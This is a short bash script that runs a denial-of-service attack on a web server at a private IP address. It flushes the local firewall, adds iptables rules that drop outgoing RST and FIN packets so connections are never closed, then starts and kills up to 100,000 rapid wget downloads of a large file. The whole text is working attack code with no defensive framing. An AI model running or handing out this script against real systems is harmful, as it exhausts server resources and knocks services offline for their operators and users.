#!/bin/bash
TAR=192.168.0.40
BIGFILE=bigdownload.iso

# Make sure to drop RST‐ACKS and FINS so that the connection is not reset
iptables -F
iptables -A OUTPUT -d $TAR -p tcp --dport 80 --tcp-flags SYN,ACK,RST RST,ACK -j DROP
iptables -A OUTPUT -d $TAR -p tcp --dport 80 --tcp-flags FIN FIN -j DROP
iptables -A OUTPUT -d $TAR -p tcp --dport 80 --tcp-flags SYN,ACK,RST RST -j DROP

for f in `seq 1 100000`
do
    wget -q http://$TAR/$BIGFILE -O /dev/null & 
    p=$!
    sleep 0.1
    kill -9 $p &>/dev/null
done
